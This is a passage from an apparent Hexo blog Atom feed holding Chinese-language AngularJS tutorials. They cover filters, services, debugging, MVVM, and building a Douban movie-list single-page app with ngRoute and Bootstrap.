'xxx'&#125;</span><br><span class="line">  &lt;label&gt;Phone only &lt;input ng-model="search.phone"&gt;&lt;/label&gt;&lt;br&gt; &#123;phone: 'xxx'&#125;</span><br><span class="line">  &lt;label&gt;Equality &lt;input type="checkbox" ng-model="strict"&gt;&lt;/label&gt; </span><br><span class="line">  &lt;table&gt;</span><br><span class="line">    &lt;thead&gt;&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;电话&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;&lt;tr ng-repeat="friend in friends | filter:search:strict track by $index"&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;td&gt;&#123;&#123;friend.phone&#125;&#125;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">  &lt;script src="../code/js/angular.js"&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    angular.module('DemoApp', []);.controller('DemoController', ['$scope','$filter', function ($scope, $filter) &#123;</span><br><span class="line">      $scope.time = new Date();</span><br><span class="line">      $scope.user = &#123;name: 'Jack',age: 18&#125;;</span><br><span class="line">      console.log($filter('date')($scope.time, 'yyyy-MM-dd HH:mm:ss'));</span><br><span class="line">      $scope.friends = [&#123;name:'John', phone:'555-1276'&#125;,&#123;name:'Mary', phone:'800-BIG-MARY'&#125;,&#123;name:'Mike', phone:'555-4321'&#125;];</span><br><span class="line">      $scope.searchText = '';</span><br><span class="line">      $scope.search = &#123;&#125;;</span><br><span class="line">    &#125;]);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="服务：Service"><a href="#服务：Service" class="headerlink" title="服务：Service"></a>服务：Service</h2><p>在 Angular 中，服务的概念和后台的服务概念基本是一样的，差别只是在于技术细节。</p><p>服务是对公共代码的抽象，比如，如果在多个控制器中都出现了相似的代码，那么把它们提取出来，封装成一个服务，在可维护性方面获得提升。</p><p>然而，在工程实践中，引入服务的主要目的是为了优化代码结构，而不是复用。复用只是一项结果，而不是目标。</p><h2 id="Angular-调试"><a href="#Angular-调试" class="headerlink" title="Angular 调试"></a>Angular 调试</h2><h3 id="将-scope-模型对象挂载给-window"><a href="#将-scope-模型对象挂载给-window" class="headerlink" title="将 $scope 模型对象挂载给 window"></a>将 $scope 模型对象挂载给 window</h3><p>不推荐使用，麻烦</p><h3 id="Chrome-插件：AngularJS-Batarang"><a href="#Chrome-插件：AngularJS-Batarang" class="headerlink" title="Chrome 插件：AngularJS Batarang"></a>Chrome 插件：AngularJS Batarang</h3><ul><li>安装插件</li></ul><p>基本使用：</p><ol><li>以 http 协议访问你要调试的页面</li><li>打开控制台，找到 AngularJS</li><li>选择 Enable 启用调试</li><li>切换到 Scope 选项卡</li></ol><h2 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h2><h3 id="M-Model"><a href="#M-Model" class="headerlink" title="M: Model"></a>M: Model</h3><p>M: 数据模型</p><h3 id="V"><a href="#V" class="headerlink" title="V"></a>V</h3><p>V: 视图</p><h3 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h3><p>ViewModel: 视图模型</p><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>用来处理视图模型和视图的交互的</p><h2 id="使用-ng-总结"><a href="#使用-ng-总结" class="headerlink" title="使用 ng 总结"></a>使用 ng 总结</h2><ul><li>AngularJS 最大程度上减少了页面上的 DOM 操作</li><li>让开发人员更专注于业务操作</li><li>通过简洁的指令结合页面结构与逻辑数据</li><li>通过自定义指令实现组件化编程</li><li>代码结构更合理</li><li>维护成本更低</li><li>AngularJS 解放了传统 JavaScript 中频繁的 DOM 操作</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写在最前：由于 ng 的表达式和博客有冲突，所以除了代码块之外所有的大括号经过了 \ 转义！&lt;/p&gt;
&lt;h2 id=&quot;Angular-介绍&quot;&gt;&lt;a href=&quot;#Angular-介绍&quot; class=&quot;headerlink&quot; title=&quot;Angular 介绍&quot;&gt;&lt;/a&gt;Angular 介绍&lt;/h2&gt;&lt;h3 id=&quot;什么是框架和库&quot;&gt;&lt;a href=&quot;#什么是框架和库&quot; class=&quot;headerlink&quot; title=&quot;什么是框架和库&quot;&gt;&lt;/a&gt;什么是框架和库&lt;/h3&gt;&lt;p&gt;库是由开发人员主动使用库里面提供的 API，完成代码功能逻辑&lt;/p&gt;
&lt;p&gt;框架里面提供了各种各样的库，这些库可以调用使用，也可以由框架去调用使用&lt;/p&gt;
&lt;h3 id=&quot;什么是-AngularJS&quot;&gt;&lt;a href=&quot;#什么是-AngularJS&quot; class=&quot;headerlink&quot; title=&quot;什么是 AngularJS&quot;&gt;&lt;/a&gt;什么是 AngularJS&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一款非常优秀的前端高级 &lt;strong&gt;JavaScript&lt;/strong&gt; 框架&lt;/li&gt;
&lt;li&gt;可以轻松构建 &lt;strong&gt;SPA 应用程序&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;通过 &lt;strong&gt;指令&lt;/strong&gt; 扩展了 HTML，通过 &lt;strong&gt;表达式&lt;/strong&gt; 绑定数据到 HTML&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最大程度上解放了 DOM 操作&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;构建更加动感的 HTML 应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;AngularJS是为了克服HTML在构建应用上的不足而设计的。AngularJS有着诸多特性，最为核心的是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MVC&lt;/li&gt;
&lt;li&gt;模块化&lt;/li&gt;
&lt;li&gt;自动化双向数据绑定&lt;/li&gt;
&lt;li&gt;语义化标签、依赖注入等等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;为什么使用-Angular&quot;&gt;&lt;a href=&quot;#为什么使用-Angular&quot; class=&quot;headerlink&quot; title=&quot;为什么使用 Angular&quot;&gt;&lt;/a&gt;为什么使用 Angular&lt;/h3&gt;
    
    </summary>
    
      <category term="AngularJS系列" scheme="http://yoursite.com/categories/AngularJS%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="AngularJS" scheme="http://yoursite.com/tags/AngularJS/"/>
    
  </entry>
  
  <entry>
    <title>AngularJS 框架</title>
    <link href="http://yoursite.com/2016/03/18/AngularJS%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2016/03/18/AngularJS项目流程/</id>
    <published>2016-03-17T16:00:00.000Z</published>
    <updated>2018-06-04T06:52:11.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="豆瓣电影列表项目说明"><a href="#豆瓣电影列表项目说明" class="headerlink" title="豆瓣电影列表项目说明"></a>豆瓣电影列表项目说明</h2><blockquote><p>使用 AngularJS + Bootstrap + Node.js 构建的一个电影列表展示单页应用</p></blockquote><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nodemon add.js</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node add.js</span><br></pre></td></tr></table></figure><h2 id="豆瓣开发接口-API"><a href="#豆瓣开发接口-API" class="headerlink" title="豆瓣开发接口 API"></a>豆瓣开发接口 API</h2><ul><li>所有的接口地址都是以：<a href="http://api.douban.com/v2" target="_blank" rel="noopener">http://api.douban.com/v2</a> 开头的</li><li>正在热映 <a href="http://api.douban.com/v2/movie/in_theaters" target="_blank" rel="noopener">http://api.douban.com/v2/movie/in_theaters</a></li><li>即将上映 <a href="http://api.douban.com/v2/movie/coming_soon" target="_blank" rel="noopener">http://api.douban.com/v2/movie/coming_soon</a></li><li>top250 <a href="http://api.douban.com/v2/movie/top250" target="_blank" rel="noopener">http://api.douban.com/v2/movie/top250</a></li><li>search <a href="http://api.douban.com/v2/movie/search?q={text}" target="_blank" rel="noopener">http://api.douban.com/v2/movie/search?q={text}</a></li><li>电影条目接口: <a href="http://api.douban.com/v2/movie/subject/:id" target="_blank" rel="noopener">http://api.douban.com/v2/movie/subject/:id</a></li></ul><a id="more"></a><h2 id="项目骨架"><a href="#项目骨架" class="headerlink" title="项目骨架"></a>项目骨架</h2><ul><li>app<ul><li>app.js</li><li>app.css</li><li>index.html</li><li>in_theaters<ul><li>view.html</li><li>module.js</li></ul></li><li>coming_soon<ul><li>view.html</li><li>module.js</li></ul></li><li>top250<ul><li>view.html</li><li>module.js</li></ul></li></ul></li><li>READMO.md</li><li>.gitignore</li><li>.editorconfig</li><li>bower.json</li><li>.bowerrc</li></ul><h2 id="页面开发流程："><a href="#页面开发流程：" class="headerlink" title="页面开发流程："></a>页面开发流程：</h2><h3 id="一-、构建页面（bootstrap）"><a href="#一-、构建页面（bootstrap）" class="headerlink" title="(一)、构建页面（bootstrap）"></a>(一)、构建页面（bootstrap）</h3><p>选择模板 –&gt; 列表组 –&gt; 媒体组件</p><p>模板页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;title&gt;豆瓣电影列表&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;link href="node_modules/</span>bootstrap/dist/css/bootstrap.css<span class="string">" rel="</span>stylesheet<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;link href="</span>css/main.css<span class="string">" rel="</span>stylesheet<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;nav class="</span>navbar navbar-inverse navbar-fixed-top<span class="string">" role="</span>navigation<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>container-fluid<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="</span>navbar-header<span class="string">"&gt;</span></span><br><span class="line">          &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"sr-only"</span>&gt;Toggle navigation&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">            &lt;span class="icon-bar"&gt;&lt;/</span>span&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;&lt;/span&gt;</span><br><span class="line">          &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">          &lt;a class="navbar-brand" href="#"&gt;豆瓣电影列表&lt;/</span>a&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div id="navbar" class="navbar-collapse collapse"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;ul class="nav navbar-nav navbar-right"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li&gt;&lt;a href="#"&gt;关于&lt;/</span>a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">          &lt;form class="navbar-form navbar-right" &gt;</span></span><br><span class="line"><span class="regexp">            &lt;input type="text" class="form-control" placeholder="Search..."&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>form&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/nav&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="container-fluid"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div class="row"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-sm-3 col-md-2 sidebar"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;ul class="nav nav-sidebar"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li class="active"&gt;&lt;a href="#"&gt;正在热映&lt;/</span>a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href="#"&gt;即将上映&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href="#"&gt;Top250&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"</span>&gt;</span><br><span class="line">          &lt;!-- 每一页不同的部分 --&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><h3 id="二-、模块划分"><a href="#二-、模块划分" class="headerlink" title="(二)、模块划分"></a>(二)、模块划分</h3><blockquote><p>中间变化部分每一个对应一个视图： view.html 和 模块 module.js</p></blockquote><p>in-theaters 正在热映视图、正在热映控制器、正在热映对应的模型代码</p><p>coming-soon 即将上映视图、即将上映控制器、即将上映对应的模型代码</p><p>top250 top250视图、top250控制器、top250模型代码</p><p>局部 HTML 发生变化。</p><blockquote><p>路由：</p></blockquote><ul><li>Node 中的路由：后台接收请求，渲染了了不同的页面。</li><li>前端路由，当点击一个连接的时候，显示不同的页面，不需要后台，前端也可以渲染，无非前端的路由变成了哈希值了。</li></ul><p>主模块：–&gt; view 里放变化的中间的内容：怎么放？怎么加载？点击即将上映，局部 HTML 发生变化。–&gt; 前端路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div ng-view <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"</span>&gt;</span><br><span class="line">  &lt;!-- 每一页不同的部分 --&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这回是前端路由，前端的路由变成了 hash 值。</strong></p><blockquote><p><code>view.html</code> 中放中间变化的内容</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 每页不同部分 --&gt;</span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-header"</span>&gt;header&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- 列表组 --&gt;</span></span><br><span class="line"><span class="regexp">&lt;div class="list-group"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;a href="#/</span>subject/&#123;&#123;movie.id&#125;&#125;<span class="string">" class="</span>list-group-item<span class="string">" &gt;</span></span><br><span class="line"><span class="string">    &lt;!-- 媒体组件 --&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>media<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>media-left<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;img src="</span>...<span class="string">" alt="</span>...<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>media-body<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h4 class="</span>media-heading<span class="string">"&gt;&#123;&#123; movie.title &#125;&#125;&lt;/h4&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;类型：剧情、爱情、同性 &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;导演：&lt;span&gt;陈凯歌&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;主演：&lt;span&gt;张国荣&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;总共：1条记录，第1/8页&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;nav&gt;</span></span><br><span class="line"><span class="string">  &lt;ul class="</span>pager<span class="string">"&gt;</span></span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;上一页&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;下一页&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>nav&gt;</span><br></pre></td></tr></table></figure><p>★★★★★★★★★★★★★★★★★★</p><blockquote><p>在 angular 中使用路由，ng 官方提供了一个 ngRoute 模块。</p></blockquote><p>(1)、视图(v)-页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ... --&gt;</span><br><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span>&gt;</span><br><span class="line">  &lt;header&gt;</span><br><span class="line">    &lt;h1&gt;ng 中的路由模块 ngRoute 的使用&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>header&gt;</span><br><span class="line">  &lt;article&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;!-- 这里是主页面中需要改变的内容 --&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>article&gt;</span><br><span class="line">  &lt;footer&gt;</span><br><span class="line">    &lt;p&gt;这里是页面脚部&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>footer&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br></pre></td></tr></table></figure><p>(2). 安装包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save angular</span><br><span class="line">$ npm install --save angular-route</span><br></pre></td></tr></table></figure><p>(3). 在视图页面中引包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"node-modules/angular/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"node-modules/angular-route/angular-route.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>(4). 创建模块</p><blockquote><p>使用 Angular 的依赖模块 ngRoute</p></blockquote><p><a href="https://docs.angularjs.org/api/ngRoute" target="_blank" rel="noopener">ngRoute 官方文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载专门处理路由的 ngRoute 模块</span></span><br><span class="line">angular.module(<span class="string">'DemoApp'</span>, [<span class="string">'ngRoute'</span>])</span><br><span class="line">  .config([<span class="string">'$routeProvider'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$routeProvider</span>) </span>&#123;</span><br><span class="line">    $routeProvider</span><br><span class="line">      <span class="comment">// 请求这个路径的时候，访问 a.html，把哪个控制器作用的这个视图上</span></span><br><span class="line">      .when(<span class="string">'/in_theaters:id'</span>, &#123;</span><br><span class="line">        <span class="comment">// 渲染哪个页面</span></span><br><span class="line">        templateUrl: <span class="string">'a.html'</span>,</span><br><span class="line">        <span class="comment">// 把哪个控制器作用到了视图上</span></span><br><span class="line">        controller: <span class="string">'DemoAController'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      .when(<span class="string">'/coming_soon'</span>, &#123;</span><br><span class="line">        templateUrl: <span class="string">'b.html'</span>,</span><br><span class="line">        controller: <span class="string">'DemoBController'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      .when(<span class="string">'/top250'</span>, &#123;</span><br><span class="line">        templateUrl: <span class="string">'c.html'</span>,</span><br><span class="line">        controller: <span class="string">'DemoCController'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 当匹配不到以上路径的时候，让它跳转</span></span><br><span class="line">      .otherwise(&#123;</span><br><span class="line">        redirectTo: <span class="string">'/in_theaters'</span></span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;])</span><br><span class="line">  .controller(<span class="string">'DemoAController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.title = <span class="string">'AAA'</span>;</span><br><span class="line">  &#125;])</span><br><span class="line">  .controller(<span class="string">'DemoBController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.movie = &#123;</span><br><span class="line">      src: <span class="string">'https://img3.doubanio.com/view/movie_poster_cover/ipst/public/p2392444121.jpg'</span>,</span><br><span class="line">      name: <span class="string">'神奇动物在哪里'</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;])</span><br><span class="line">  .controller(<span class="string">'DemoCController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.fruits = [</span><br><span class="line">      <span class="string">'苹果'</span>,</span><br><span class="line">      <span class="string">'香蕉'</span>,</span><br><span class="line">      <span class="string">'橘子'</span>,</span><br><span class="line">      <span class="string">'菠萝'</span></span><br><span class="line">    ];</span><br><span class="line">  &#125;]);</span><br></pre></td></tr></table></figure><p>(5). 控制器作用到视图</p><p>a.html 页面需要一个 title</p><ul><li><code>&lt;h2&gt;AngularJS 项目流程&lt;/h2&gt;</code></li></ul><p>b.html 页面需要一个src</p><ul><li><code>&lt;img ng-src=&quot;&quot; alt=&quot;&quot; /&gt;</code></li><li><code>&lt;h4&gt;&lt;/h4&gt;</code></li></ul><p>c.html 页面需要列表</p><ul><li><code>&lt;li ng-repeat=&quot;fruit in fruits track by $index&quot;&gt;&lt;/li&gt;</code></li></ul><p>(6). 作用到主页面视图<code>-ng-view</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span>&gt;</span><br><span class="line">  &lt;header&gt;</span><br><span class="line">    &lt;h1&gt;ng 中的路由模块 ngRoute 的使用&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>header&gt;</span><br><span class="line">  &lt;article&gt;</span><br><span class="line">    &lt;div ng-view&gt;</span><br><span class="line">      &lt;!-- 这里是主页面中需要改变的内容 --&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>article&gt;</span><br><span class="line">  &lt;footer&gt;</span><br><span class="line">    &lt;p&gt;这里是页面脚部&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>footer&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br></pre></td></tr></table></figure><p>★★★★★★★★★★★★★★★★★★</p><h3 id="三-、模块划分-控制器-路由"><a href="#三-、模块划分-控制器-路由" class="headerlink" title="(三)、模块划分-控制器-路由"></a>(三)、模块划分-控制器-路由</h3><p>通过主模块加载 3 个小模块</p><p>主页面： index.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- ... --&gt;</span><br><span class="line">  &lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">  &lt;!-- 指定入口标识 --&gt;</span></span><br><span class="line"><span class="regexp">  &lt;body ng-app="movie.main"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;!-- ... --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>nav&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container-fluid"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-3 col-md-2 sidebar"</span>&gt;</span><br><span class="line">          &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"nav nav-sidebar"</span>&gt;</span><br><span class="line">            &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"active"</span>&gt;&lt;a href="#/in_theaters"&gt;正在热映&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a 